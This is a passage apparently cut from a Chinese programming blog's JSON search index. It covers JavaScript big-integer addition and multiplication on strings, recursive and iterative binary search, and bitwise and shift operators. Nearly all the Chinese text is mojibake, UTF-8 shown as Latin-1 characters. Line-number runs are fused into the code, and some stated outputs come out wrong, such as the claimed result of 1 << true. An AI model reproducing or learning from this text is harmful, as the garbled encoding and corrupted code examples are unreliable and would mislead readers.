BigInt(TESTNUMBER) + BigInt(TESTNUMBER);console.log(ANSWER === BIGINT); // true è§£é‡‹ä¸€ä¸‹ç‚ºä»€éº¼ä¸€å®šè¦åŠ é€™æ®µï¼š 1234// å‰©ä¸€å€‹æ•¸å­— but æœ‰é€²ä½æ•¸è¦å†è£œ 1ï¼ˆå› ç‚ºä¸è·‘ä¸‹ä¸€åœˆï¼‰if (i===0 &amp;&amp; hasCarryBit) { result = '1' + result;} å‡è¨­æ•¸å­—æ˜¯ 95 + 40ï¼Œç®—åˆ° 9 + 4 = 13 çš„æ™‚å€™ï¼Œå‰é¢çš„ 1 ç†æ‡‰è¦åœ¨ä¸‹åœˆåŠ ä¸Šå»ï¼Œä½†è¦æ³¨æ„è¿´åœˆåªæœƒè·‘åˆ°æ•¸å­—é•·åº¦ï¼Œæ‰€ä»¥å¦‚æœæ²’æœ‰åŠ ä¸Šé€™æ®µç­”æ¡ˆæœƒæ˜¯ 35 ä¸æ˜¯ 135ã€‚ æ‰€ä»¥è©²æ€éº¼è¾¦ï¼Ÿæ²’æœ‰æ€éº¼è¾¦ï¼Œæ—¢ç„¶è¿´åœˆä¸æœƒè·‘ä¸‹ä¸€åœˆï¼Œé‚£ä½ åªèƒ½åœ¨æœ€å¾Œä¸€åœˆçš„æ™‚å€™åˆ¤æ–·æœ‰æ²’æœ‰é€²ä½æ•¸ï¼Œæœ‰çš„è©±å°±è¦è‡ªå·±è£œ 1 åˆ°å‰é¢ï¼Œé€™å°±æ˜¯ç‚ºä»€éº¼é€™æ®µå¾ˆé‡è¦ã€‚ å¤§æ•¸ç›¸ä¹˜ç›¸ä¹˜çš„é‚è¼¯å¤§è‡´ä¸Šè·Ÿç›¸åŠ å·®ä¸å¤šï¼Œä½†æœ‰å¹¾é»è¦æ³¨æ„ï¼š æ¯ä¸€å±¤è¦æ ¹æ“šä½æ•¸åœ¨å°¾å·´è£œä¸Š 0ï¼ˆå°±è·ŸåšåŠ æ³•çš„æ™‚å€™ä¸€æ¨£ï¼‰ é€²ä½å€¼è¦ç”¨é™¤ä»¥ 10 çš„æ–¹å¼ä¾†ç®—ï¼ˆç¯„åœè®Šæˆ 0 ~ 9ï¼‰ è¦ç”¨ç´¯åŠ å™¨ä¾†ç´€éŒ„ä¸Šä¸€æ¬¡çš„å€¼ï¼ˆç®—ç›´å¼çš„æ™‚å€™è¦ä¸€å±¤ä¸€å±¤åŠ ç¸½ï¼Œæ‰€ä»¥å¾—ç´€éŒ„ä¸Šä¸€å±¤çš„å€¼ï¼‰ é€™é‚Šæˆ‘éƒ½å¯«è¨»è§£äº†ï¼Œä»”ç´°çœ‹çš„è©±æ‡‰è©²å¯ä»¥ç†è§£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119function multiply(a, b) { let result = ''; // ç´€éŒ„ç›®å‰çš„ä½æ•¸ let currentDigit = 0; // ç´¯åŠ å™¨ let accumulator = '0'; // æŠŠ b ä¹˜ä¸Š a çš„æ¯ä¸€ä½æ±‚å‡º sum for (let i=b.length-1; i&gt;=0; i--) { let sum = ''; // é€²ä½çš„å€¼ let carryBit = 0; // æœ‰æ²’æœ‰é€²ä½ï¼ˆflagï¼‰ let hasCarryBit = false; // a çš„éƒ¨åˆ† for(let j=a.length-1; j&gt;=0; j--) { // b x a çš„å€¼ let value = Number(b[i]) * Number(a[j]); // æœ‰é€²ä½å°±æŠŠæ•¸å­—åŠ ä¸Šå» if (hasCarryBit) { value += carryBit; carryBit = 0; hasCarryBit = false; } // å¤§æ–¼ 10ï¼Œç®—å‡ºé€²ä½å€¼ï¼Œæ›´æ–° flag if (value &gt;= 10) { hasCarryBit = true; carryBit = Math.floor(value/10); } /* 5 + '' =&gt; '5' 9 + '5' =&gt; '95' 7 + '95' =&gt; '795' ... */ sum = value%10 + sum; // å‰©ä¸€å€‹æ•¸å­— but æœ‰é€²ä½æ•¸ if (j===0 &amp;&amp; hasCarryBit) { sum = carryBit + sum; } } /* åä½æ•¸è£œä¸€å€‹ 0 ç™¾ä½æ•¸è£œå…©å€‹ 0 ... */ for (let i=0; i&lt;currentDigit; i++) { sum = sum + '0'; } // åšå¤§æ•¸ç›¸åŠ ï¼ˆæ‹¿ä¸Šé¢å¯«å¥½çš„ä¾†ç”¨ï¼‰ result = add(sum, accumulator); // åŠ å®Œå¾Œæ›´æ–°ç´¯åŠ å™¨ accumulator = result; // æ›´æ–°ç›®å‰æ˜¯å¹¾ä½æ•¸ currentDigit++; } // ç­”æ¡ˆ return result;}// é€™æ®µæ˜¯å‰é¢å¯«å¥½çš„ function ä¸ç”¨çœ‹function add(a, b){ let result = ''; // æœ‰æ²’æœ‰é€²ä½ï¼ˆflagï¼‰ let hasCarryBit = false; // çœ‹èª°æ¯”è¼ƒé•· const lengthA = a.length; const lengthB = b.length; let totalDigits = undefined; // æ¯”è¼ƒçŸ­çš„æ•¸å­—è¦è£œ 0 if (lengthA &gt; lengthB) { totalDigits = lengthA; for (let i=0; i&lt;lengthA - lengthB; i++) { b = '0' + b; } } else if (lengthA &lt; lengthB) { totalDigits = lengthB; for (let i=0; i&lt;lengthB - lengthA; i++) { a = '0' + a; } } else { totalDigits = lengthA; } // æŠŠæ¯ä¸€ä½æ•¸ç›¸åŠ  for (let i=totalDigits-1; i&gt;=0; i--) { let value = Number(a[i]) + Number(b[i]); // ä¸Šä¸€ä½æœ‰é€²ä½å°±åŠ  1 if (hasCarryBit) { value += 1; hasCarryBit = false; } // &gt;= 10 æ›´æ–° flag if (value &gt;= 10) { hasCarryBit = true; } /* å–å‡ºæœ€å¾Œä¸€ä½æ•¸ 19 =&gt; 9 + '' =&gt; '9' 5 =&gt; 5 + '' =&gt; '69' 13 =&gt; 3 + '' =&gt; '369' ... */ result = value%10 + result; // å‰©ä¸€å€‹æ•¸å­— but æœ‰é€²ä½æ•¸è¦å†è£œ 1ï¼ˆå› ç‚ºä¸è·‘ä¸‹ä¸€åœˆï¼‰ if (i===0 &amp;&amp; hasCarryBit) { result = '1' + result; } } // ç­”æ¡ˆ return result;}const TESTNUMBER = '124902814902890825902840917490127902791247902479027210970941724092174091274902749012740921759037590347438758957283947234273942304239403274093275902375902374092410937290371093719023729103790123';const ANSWER = BigInt(multiply(TESTNUMBER, TESTNUMBER));const BIGINT = BigInt(TESTNUMBER) * BigInt(TESTNUMBER);console.log(ANSWER === BIGINT); // true","link":"/2022/02/13/bigint-multiplication/"},{"title":"äºŒåˆ†æœå°‹æ³•ï¼ˆBinary-searchï¼‰","text":"ç¶“å…¸çš„æœå°‹æ³•ã€‚ æ¦‚å¿µè·Ÿç©çµ‚æ¥µå¯†ç¢¼çš„æ–¹æ³•ä¸€æ¨£ï¼Œå‡è¨­æœ‰ 1 åˆ° 100 å€‹æŒ‰ç…§é †åºæ’å¥½çš„æ•¸å­—ï¼Œåœ¨çŒœæ•¸å­—æ™‚ï¼Œæˆ‘å€‘é€šå¸¸æœƒé€™æ¨£åšï¼š ä¸€é–‹å§‹çŒœ 50 =&gt; å¦‚æœæ•¸å­—æ¯” 50 å¤§ï¼Œæ¥è‘—çŒœ 51 ~ 100 æ¥è‘—çŒœ 75 =&gt; å¦‚æœæ•¸å­—æ¯” 75 å¤§ï¼Œæ¥è‘—çŒœ 76 ~ 100 æ¥è‘—çŒœ 87 =&gt; å¦‚æœæ•¸å­—æ¯” 87 å¤§ï¼Œæ¥è‘—çŒœ 88 ~ 100 ä»¥æ­¤é¡æ¨â€¦ æ¯æ¬¡éƒ½æŠŠæ‰€æœ‰å¯èƒ½æ‹†æˆå…©åŠï¼Œå°±æ˜¯äºŒåˆ†æœå°‹æ³•çš„æ ¸å¿ƒç†å¿µã€‚ä½†è¦åˆ‡è¨˜çš„ä¸€é»æ˜¯ï¼Œé€™åªé©ç”¨æ–¼ã€Œå·²ç¶“æ’åˆ—å¥½çš„æ•¸åˆ—ã€ã€‚ å¯¦ä½œï¼éè¿´æ³•1234567891011121314151617181920212223242526272829303132333435363738// è¦éè¿´çš„ function function binarySearchRecursively(array, targetElement, start, end) { // å·¦é‚Šç•Œ &gt; å³é‚Šç•Œ if (start &gt; end) { return -1 } // ä¸­é–“ä½ç½®ï¼ˆç„¡æ¢ä»¶æ¨å»ï¼Œå–åå·¦é‚Šé‚£é»ï¼‰ const middle = (start + end) &gt;&gt; 1 /* ç›®æ¨™ = ä¸­é–“é‚£å€‹æ•¸å­—ï¼š æ‰¾åˆ°æ•¸å­—äº†ï¼Œç›´æ¥å›å‚³ä½ç½® ç›®æ¨™ &gt; ä¸­é–“çš„æ•¸å­—ï¼š ä»£è¡¨å‰é¢çš„æ•¸å­—ä¸ç”¨çœ‹äº†ï¼ŒæŠŠ start è¨­ç‚ºä¸­é–“ä½ç½®å¾€å³ç§»ä¸€ä½ï¼ˆ+1ï¼‰ ç›®æ¨™ &lt; ä¸­é–“çš„æ•¸å­—ï¼š ä»£è¡¨å¾Œé¢çš„æ•¸å­—ä¸ç”¨çœ‹äº†ï¼ŒæŠŠ end è¨­ç‚ºä¸­é–“ä½ç½®å¾€å·¦ç§»ä¸€ä½ï¼ˆ-1ï¼‰ */ if (targetElement === array[middle]) { return middle } else if (targetElement &gt; array[middle]) { // æ›´æ–° start å¾Œï¼Œéè¿´ binarySearchRecursively return binarySearchRecursively(array, targetElement, middle + 1, end) } else { // æ›´æ–° end å¾Œï¼Œéè¿´ binarySearchRecursively return binarySearchRecursively(array, targetElement, start, middle - 1) }}// ç”¨ä¾†åŸ·è¡Œ binarySearchRecursivelyfunction binarySearch(array, targetElement) { return binarySearchRecursively(array, targetElement, 0, array.length-1)}const numbers = [1, 3, 24, 33, 57, 88, 99, 101]console.log(binarySearch(numbers, 25)) // -1console.log(binarySearch(numbers, 24)) // 2 è©³ç´°æµç¨‹ï¼š 1234567891011121314151617181920212223ç¬¬ä¸€è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 7middle: 3 number: 33ç¬¬äºŒè¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 2middle: 1 number: 3ç¬¬ä¸‰è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 2 end: 2middle: 2 number: 24ç¬¬å››è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 3 end: 2 =&gt; åˆ°æ­¤ç‚ºæ­¢ï¼Œå·¦é‚Šç•Œè¶…å‡ºå³é‚Šç•Œresult: -1 è£œå……ä¸€é€™è£¡è¦æ³¨æ„ä¸€é»ï¼Œ(start &gt; end) ä¸å¯ä»¥æ˜¯ &gt;=ï¼Œè¦ä¸ç„¶æœƒæ¼æ‰ä¸€å€‹æœå°‹ï¼š 12345678910111213141516171819ç¬¬ä¸€è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 7middle: 3 number: 33ç¬¬äºŒè¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 2middle: 1 number: 3ç¬¬ä¸‰è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 2 end: 2 =&gt; åˆ°æ­¤ç‚ºæ­¢ï¼Œå·¦é‚Šç•Œè¶…å‡ºå³é‚Šç•Œresult: -1(middle: 2 number: 24) =&gt; é‚„æ²’æœ‰è¢«æœå°‹åˆ°å°± return -1 äº† è£œå……äºŒbinarySearchRecursively(array, targetElement, 0, array.length-1) ä¸­çš„ array.length - 1 ä¸å¯ä»¥æ”¹å¯«æˆ array.lengthã€‚ å‡è¨­è¦æ‰¾çš„æ•¸å­—æ˜¯ 101ï¼Œæœ€å¾Œå°±æœƒå»æ‰¾ array[length] é€™å€‹æ•¸å­—ï¼Œä½†é€™å·²ç¶“è¶…å‡º array çš„ç¯„åœäº†ï¼Œæ‰€ä»¥æœƒå¾—åˆ° undefinedã€‚é€™é¡¯ç„¶ä¸æ˜¯ä»¶å¾ˆå¥½çš„äº‹æƒ…ï¼Œå¦‚æœæ›å€‹ç¨‹å¼èªè¨€æœ‰å¯èƒ½å°±æœƒç›´æ¥å™´ errorï¼Œæˆ–æ˜¯å›å‚³ä¸€å€‹å¥‡æ€ªçš„ç­”æ¡ˆï¼š 1234567891011121314151617181920212223242526272829ç¬¬ä¸€è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 0 end: 8middle: 4 number: 57ç¬¬äºŒè¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 5 end: 8middle: 6 number: 99ç¬¬ä¸‰è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 7 end: 8middle: 7 number: 101ç¬¬å››è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 8 end: 8middle: 8 number: undefined =&gt; é€™è£¡å¾ˆå±éšªï¼ç¬¬äº”è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 8 end: 7value: -1 =&gt; é›–ç„¶æœ€å¾Œé‚„æ˜¯èƒ½å¾—åˆ°æ­£ç¢ºçµæœ å¯¦ä½œï¼è¿´åœˆè¿­ä»£æ³•12345678910111213141516171819202122232425262728293031323334function binarySearch(array, targetElement) { // åˆå§‹å€¼ï¼š0 ~ array çš„é•·åº¦ -1 let start = 0 let end = array.length - 1 // çµ‚æ­¢æ¢ä»¶ å·¦é‚Šç•Œ &lt;= å³é‚Šç•Œ while (start &lt;= end) { // ä¸­é–“ä½ç½®ï¼ˆç„¡æ¢ä»¶æ¨å»ï¼Œå–åå·¦é‚Šé‚£é»ï¼‰ const middle = start + end &gt;&gt; 1 console.log('array:', array) console.log('target:', targetElement) console.log('start:', start, 'end:', end) console.log('middle:', middle, 'number:', array[middle]) /* ç›®æ¨™ = ä¸­é–“é‚£å€‹æ•¸å­—ï¼š æ‰¾åˆ°æ•¸å­—äº†ï¼Œç›´æ¥å›å‚³ä½ç½® ç›®æ¨™ &gt; ä¸­é–“çš„æ•¸å­—ï¼š ä»£è¡¨å‰é¢çš„æ•¸å­—ä¸ç”¨çœ‹äº†ï¼ŒæŠŠ start è¨­ç‚ºä¸­é–“ä½ç½®å¾€å³ç§»ä¸€ä½ï¼ˆ+1ï¼‰ ç›®æ¨™ &lt; ä¸­é–“çš„æ•¸å­—ï¼š ä»£è¡¨å¾Œé¢çš„æ•¸å­—ä¸ç”¨çœ‹äº†ï¼ŒæŠŠ end è¨­ç‚ºä¸­é–“ä½ç½®å¾€å·¦ç§»ä¸€ä½ï¼ˆ-1ï¼‰ */ if (targetElement === array[middle]) { return middle } else if (targetElement &gt; array[middle]) { start = middle + 1 } else { end = middle - 1 } } // æ‰¾ä¸åˆ°ç›®æ¨™æ•¸å­—ï¼Œå›å‚³ -1 return -1} è©³ç´°æ­¥é©Ÿï¼ˆè·Ÿå‰›å‰›å·®ä¸å¤šï¼‰ï¼š 123456789101112131415161718ç¬¬ä¸€è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 7middle: 3 number: 33ç¬¬äºŒè¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 2middle: 1 number: 3ç¬¬ä¸‰è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 2 end: 2middle: 2 number: 24value: -1 è£œå……é€™è£¡ä¸€æ¨£è¦æ³¨æ„ While (start &lt;= end) ä¸å¯ä»¥å¯«æˆæ˜¯ &lt;ï¼Œä¸ç„¶æœƒå¿½ç•¥æ‰ä¸€å€‹æœå°‹ï¼š ï¼ˆå…©è€…å·®åˆ¥åœ¨æ–¼ï¼Œéè¿´æ˜¯ã€Œ= æ™‚ä¸èƒ½è·³æ‰ã€ï¼Œé€™è£¡æ˜¯ã€Œ= è¦å†æ‰¾ä¸€æ¬¡ã€ï¼‰ 12345678910111213141516171819ç¬¬ä¸€è¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 7middle: 3 number: 33ç¬¬äºŒè¼ªarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 2middle: 1 number: 3return -1 =&gt; ä¸‹ä¸€åœˆä¸æœƒåŸ·è¡Œï¼Œæ‰€ä»¥é€™åœˆçµæŸå°±æœƒ return -1ä¸‹ä¸€åœˆï¼ˆå¦‚æœæœ‰åŸ·è¡Œçš„è©±ï¼‰ï¼šarray: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 2 end: 2middle: 2 number: 24value: -1 å“ªå€‹æ–¹æ³•æ¯”è¼ƒå¥½ï¼Ÿæ ¹æ“šåˆ¥äººçš„èªªæ³•æ˜¯é€™æ¨£ï¼š åœ¨å¯¦ä½œç¨‹å¼çš„æ™‚å€™ï¼Œæ‡‰è©²è¦é¿å…ä½¿ç”¨éè¿´(Recursive)çš„çµæ§‹ï¼Œå› ç‚ºéè¿´éœ€è¦ä¸æ–·åœ°é‡æ–°å»ºæ§‹å‡½æ•¸çš„å †ç–Šç©ºé–“ï¼Œç¡¬é«”è³‡æºçš„è² æ“”æœƒæ¯”è¼ƒå¤§ï¼Œä¸”è‹¥æ˜¯éè¿´å±¤æ•¸éå¤šé‚„æœƒå°è‡´å †ç–Šæº¢å‡º(Stack Overflow)ã€‚æ‰€ä»¥æ¯”è¼ƒå¥½çš„åšæ³•é‚„æ˜¯åœ¨ä¸€å€‹å‡½æ•¸å…§ä»¥è¿´åœˆè¿­ä»£çš„æ–¹å¼ä¾†å®Œæˆã€‚","link":"/2022/01/18/binary-search/"},{"title":"å¾ˆæœ‰è¶£çš„ä½ç§»é‹ç®—å­èˆ‡ä½å…ƒé‹ç®—","text":"åŸä¾†å¯«ç¨‹å¼é‚„å¯ä»¥é€™æ¨£å­æ“ä½œã€‚ ä½å…ƒçš„æ¦‚å¿µé¦–å…ˆï¼Œé›»è…¦æ˜¯ç”¨ã€Œä½å…ƒã€ä¾†ç•¶ä½œå–®ä½ï¼Œä¹Ÿå°±æ˜¯äºŒé€²ä½çš„ 0 è·Ÿ 1ï¼Œæ‰€ä»¥é€™è£¡æçš„ä½å…ƒï¼Œå°±æ˜¯æŒ‡ã€ŒäºŒé€²ä½ã€æ•¸å­—çš„æ„æ€ã€‚ ä½ç§»é‹ç®—å­ä½ç§»é‹ç®—å­æ˜¯å°ã€Œä½å…ƒã€ä¾†åšä½ç§»ï¼Œåœ¨æ•ˆèƒ½ä¸Šæœƒæ¯”ä½ ç›´æ¥ç”¨åŠ æ¸›ä¹˜é™¤é‚£äº›ä¾†çš„å¥½ï¼ˆç•¢ç«Ÿé›»è…¦çš„æœ€åº•å±¤å°±æ˜¯ä¸€å † 0101ï¼‰ï¼Œæ‰€ä»¥é€™æ˜¯ä¸€å€‹å¾ˆå€¼å¾—å­¸çš„æ±è¥¿ã€‚ å¦‚æœå¿˜è¨˜äºŒé€²ä½æ€éº¼è½‰æ›çš„è©±å…ˆå¹«ä½ è¤‡ç¿’ä¸€ä¸‹ï¼š å‡è¨­æœ‰ä¸€å€‹æ•¸å­—æ˜¯ 100 ç”¨æ•¸å­¸ä¾†å¯«çš„è©±æœƒæ˜¯ï¼š2^0 x 0 + 2^1 x 0 + 2^2 x 1 = 4 ä½†å› ç‚ºå¦‚æœæ˜¯ 0 çš„è©±å°±ç­‰æ–¼ 2^n x 0ï¼Œæ‰€ä»¥ä½ çœ‹çš„æ™‚å€™å¯ä»¥ç›´æ¥å¿½ç•¥ï¼Œç›´æ¥æ€è€ƒã€Œæœ‰å€¼çš„é‚£ä¸€å€‹ä½æ•¸ã€æ˜¯å¤šå°‘æ¬¡æ–¹å°±å¥½ï¼Œé€™æ¨£æ¯”è¼ƒå¿«ï¼š 0100 = 2^2 = 41000 = 2^3 = 810000 = 2^4 = 16 ä½ç§»é‹ç®—çš„æ„æ€æ˜¯å°±æ˜¯ã€Œå…ˆæŠŠé€™å€‹æ•¸å­—è½‰æ›æˆäºŒé€²ä½ã€ï¼Œæ¥è‘—æŠŠæ¯ä¸€ä½å¾€ã€Œå·¦æˆ–å³ã€ä½ç§»ï¼Œå¾Œé¢è£œ 0ï¼š 124 &lt;&lt; 1 8 ä¸Šé¢çš„éç¨‹å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£ï¼š 12344 =&gt; 0100 è½‰æˆäºŒé€²ä½0100 &lt;&lt; 1 æ¯ä¸€ä½å¾€å·¦ç§»ä¸€ä½1000 æ¥è‘—è½‰å›åé€²ä½8 å› ç‚ºåœ¨äºŒé€²ä½è£¡ï¼Œæ¯é€²ä¸€ä½å°±ä»£è¡¨ x2ï¼Œæ‰€ä»¥ 4 å¾€å·¦ä½ç§»ä¸€ä½ï¼Œå°±ç­‰æ–¼ 4 x 2ï¼Œå¾—åˆ° 8ã€‚ å¦‚æœ 4 å¾€å·¦ç§»å…©ä½ï¼Œå°±ç­‰æ–¼ 4 x 2 x 2ï¼Œå¾—åˆ° 16ï¼Œä»¥æ­¤é¡æ¨ã€‚ æ‰€ä»¥æœ‰ä¸€å€‹å¾ˆç›´è¦ºåˆç°¡å–®çš„è¨˜æ³•ï¼š 2 &lt;&lt; 1 çœ‹æˆæ˜¯ 2 x 2^1 = 42 &lt;&lt; 2 çœ‹æˆæ˜¯ 2 x 2^2 = 82 &lt;&lt; 3 çœ‹æˆæ˜¯ 2 x 2^3 = 16 ç¸½è€Œè¨€ä¹‹ï¼Œä½ç§»å¹¾æ¬¡ 2 å°±ä¹˜å¹¾æ¬¡ï¼Œæ¥è‘—åœ¨ä¹˜ä¸ŠåŸæœ¬çš„æ•¸å­—ï¼Œä»¥æ­¤é¡æ¨ã€‚ å¦‚æœæ˜¯å¾€å³ç§»çš„è©±å°±åéä¾†ï¼Œè®Šæˆã€Œé™¤æ³•ã€çš„æ„æ€ï¼Œæ¯å¾€å³ç§»ä¸€ä½ï¼Œå°±é™¤ä»¥ 2 ä¸€æ¬¡ï¼Œä½†è¦æ³¨æ„çš„æ˜¯å³ç§»é‹ç®—æœƒçœç•¥æ‰ã€Œæµ®é»æ•¸ã€ï¼š 123453/21.53 &gt;&gt; 11 ä½å…ƒé‹ç®—ä½å…ƒé‹ç®—å­ï¼š &amp;ï¼ˆANDï¼‰ |ï¼ˆORï¼‰ ^ï¼ˆXORï¼‰ ~ï¼ˆNOTï¼‰ ä½å…ƒé‹ç®—æŒ‡çš„å°±æ˜¯ç”¨ã€ŒäºŒé€²ä½ä¾†åšé‹ç®—ã€ï¼Œåƒè€ƒé€™å€‹åœ–ï¼š æ„æ€æ˜¯å° 10 è·Ÿ 15 åš &amp; ä½å…ƒé‹ç®—ï¼ˆANDï¼‰ï¼Œ1 ä»£è¡¨ trueï¼Œ0 ä»£è¡¨ falseã€‚ æ‰€ä»¥æœ€å¾Œçš„çµæœæ˜¯ 1010ï¼Œä¹Ÿå°±æ˜¯ 10 ç”¨ JavaScript å¯«çš„çµæœï¼š 1210 &amp; 1510 |ï¼ˆORï¼‰ä¹Ÿæ˜¯ä¸€æ¨£çš„é“ç†ï¼š 1210 | 1515 æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ XOR è·Ÿ NOTã€‚ ^ï¼ˆXORï¼‰æ˜¯åªæœ‰åœ¨ 01 è·Ÿ 10 çš„æ™‚å€™æ˜¯ trueï¼Œå…¶ä»–çš† falseï¼š æ‰€ä»¥ç”¨ JavaScript å¯«çš„çµæœæ˜¯ï¼š 1210 ^ 155 ~ï¼ˆNOTï¼‰æ˜¯æŠŠæ¯å€‹ä½å…ƒéƒ½åšåå‘è™•ç†ã€‚ ä¸éè¦æ³¨æ„ä¸€ä¸‹ï¼Œä»¥å‰›å‰›çš„ä¾‹å­ 15(1111) ä½ å¯èƒ½ä»¥ç‚ºåšå®Œæœƒè®Šæˆ 0(0000)ï¼Œä½†ä¸¦ä¸æ˜¯é€™æ¨£å­ï¼š 12~15 -16 é€™æ˜¯å› ç‚º NOT æ˜¯å°ã€Œæ‰€æœ‰ä½å…ƒã€éƒ½åšåè½‰ï¼Œæ‰€ä»¥ä¸èƒ½åªçœ‹ 1111 é€™å››å€‹ä½å…ƒï¼Œå› ç‚ºå¯èƒ½é‚„æœ‰å…¶ä»–ä½å…ƒï¼ˆå‡è¨­æœ‰ 32 ä½å…ƒå¥½äº†ï¼‰ä¹Ÿè·Ÿè‘—è¢«åè½‰ï¼Œæ‰€ä»¥æœ€å¾Œæ‰æœƒå¾—åˆ° -16ã€‚ ç”¨ä½å…ƒé‹ç®—ä¾†åˆ¤æ–·å¶æ•¸å¥‡æ•¸å…ˆæ€è€ƒé€™å¼µåœ–çš„æ„æ€ï¼š æ„æ€æ˜¯èªªæˆ‘å€‘åªæƒ³çŸ¥é“æœ€å¾Œä¸€å€‹æ•¸å­—æ˜¯ 0 é‚„æ˜¯ 1ã€‚ é€™æ¨£å­åšæœ‰ä»€éº¼ç”¨é€”ï¼Ÿä»”ç´°æƒ³æƒ³çœ‹ï¼Œåœ¨äºŒé€²ä½çš„ä¸–ç•Œè£¡ï¼Œåªæœ‰ã€Œæœ€å¾Œä¸€å€‹ä½å…ƒã€èƒ½æ±ºå®šä¸€å€‹æ•¸å­—æ˜¯å¥‡æ•¸é‚„æ˜¯å¶æ•¸ï¼Œå…¶ä»–ä½å…ƒåªæœƒæœ‰å¯èƒ½æ˜¯ 0 æˆ– 2 çš„å€æ•¸ï¼Œæ›å¥è©±èªªå°±æ˜¯ã€Œå…¶ä»–ä½å…ƒåªæœƒç”¢å‡ºå¶æ•¸ã€ã€‚ ä½†æ˜¯æœ€å¾Œä¸€å€‹ä½å…ƒä¸ä¸€æ¨£ï¼Œä»–æœƒæœ‰ 0 æˆ– 1 é€™å…©å€‹å¯èƒ½ã€‚æ‰€ä»¥é‡é»ä¾†äº†ï¼Œç•¶çµæœæ˜¯ 0 çš„æ™‚å€™ï¼Œæœ€å¾Œçš„çµæœä¸€å®šæœƒæ˜¯ å¶æ•¸ï¼Œå› ç‚ºã€Œå¶æ•¸ + å¶æ•¸ã€æ°¸é éƒ½åªæœƒæ˜¯å¶æ•¸ï¼›åéä¾†ï¼Œç•¶çµæœæ˜¯ 1 çš„æ™‚å€™ï¼Œæœ€å¾Œçš„çµæœä¸€å®šæœƒæ˜¯ å¥‡æ•¸ï¼Œå› ç‚ºã€Œå¶æ•¸ + å¥‡æ•¸ã€æ°¸é éƒ½æœƒæ˜¯å¥‡æ•¸ã€‚ æ‰€ä»¥æˆ‘å¯ä»¥ç›´æ¥é©—è­‰ï¼š 1234510&amp;1011&amp;11 ç”¨ä½å…ƒé‹ç®—ä¾†ç•¶ä½œé®ç½©æˆ‘é‚„ä¸å¤ªæ‡‚é€™èƒ½æ€éº¼é‹ç”¨ï¼Œä½†å°±å…ˆè¨˜ä¸‹ä¾†ï¼Œçœ‹ä»¥å¾Œæœƒä¸æœƒæƒ³åˆ°ã€‚ ç°¡å–®ä¾†èªªï¼Œå‰é¢æ˜¯ç”¨ï¼š A &amp; 1 ä¾†åˆ¤æ–·æœ€å¾Œä¸€ä½æ•¸æ˜¯ä¸æ˜¯ 1ã€‚ ä½ ä¹Ÿå¯ä»¥æ›å€‹æƒ³æ³•ï¼Œå‡è¨­æˆ‘æƒ³çœ‹ç¬¬å››å€‹ä½å…ƒæ˜¯ä¸æ˜¯ 1ï¼Œå°±å¯ä»¥ç”¨ A &amp; 8ï¼ˆ8=1000ï¼‰ä¾†åšåˆ¤æ–·ã€‚ 0 å°±ä»£è¡¨ç¬¬å››ä½ä¸æ˜¯ 1ï¼Œ1 å°±ä»£è¡¨ç¬¬å››ä½æ˜¯ 1ã€‚ ç•¶ä½å…ƒé‹ç®—ç¢°åˆ°å¥‡æ€ªçš„è³‡æ–™å‹æ…‹æˆ‘åšé¡Œç›®æ™‚ç™¼ç”Ÿçš„ç¶“é©—ï¼Œæƒ³ç•™å€‹ç´€éŒ„ã€‚ æˆ‘åœ¨ç”¨ã€Œè®Šæ•¸ã€ä¾†åšä½å…ƒé‹ç®—æ™‚ï¼Œå› ç‚ºä¸ç¢ºå®šé€™å€‹è®Šæ•¸å€¼éƒ½è·Ÿæˆ‘é æœŸä¸­çš„ä¸€æ¨£ï¼Œæ‰€ä»¥å¼•ç™¼äº†ä¸€äº›éé æœŸçš„çµæœï¼Œä¾‹å¦‚ï¼š 1234567n = undefinedn = NaNn = nulln = 'String'n = false1 &lt;&lt; n ä¸ç®¡ n çš„å€¼æ˜¯å“ªå€‹ï¼Œæœ€å¾Œçš„è¼¸å‡ºéƒ½æœƒæ˜¯ 1ï¼Œæ‰€ä»¥åœ¨åšä½å…ƒé‹ç®—æ™‚è¦ç‰¹åˆ¥æ³¨æ„ã€Œè®Šæ•¸å€¼ã€çš„æ˜¯å¦æ­£ç¢ºå•é¡Œï¼Œè¦ä¸ç„¶ç›´æ¥å¸¶ã€Œæ•¸å­—ã€ä¾†åšæœƒæ¯”è¼ƒå®‰å…¨ä¸€é»ã€‚ å¦å¤–å¦‚æœ n = true çš„æƒ…æ³æ¯”è¼ƒç‰¹åˆ¥ä¸€é»ï¼š 12n = true1 &lt;&lt; n çµæœæœƒæ˜¯ 4ã€‚ é€™æ˜¯å› ç‚º true ä»£è¡¨ 1ï¼Œæ‰€ä»¥æƒ³æˆæ˜¯é€™æ¨£ï¼š 12n = true1 &lt;&lt; 1 ç”šè‡³è¦é€™æ¨£ç©ä¹Ÿå¯ä»¥ï¼š 11 &lt;&lt; true + true + true æœ€å¾Œå°±æœƒè¼¸å‡º 1 &lt;&lt; 3 çš„çµæœã€‚ ä½å…ƒé‹ç®—çš„åŸ·è¡Œé †åºå°±è·Ÿä¸€èˆ¬çš„åŠ 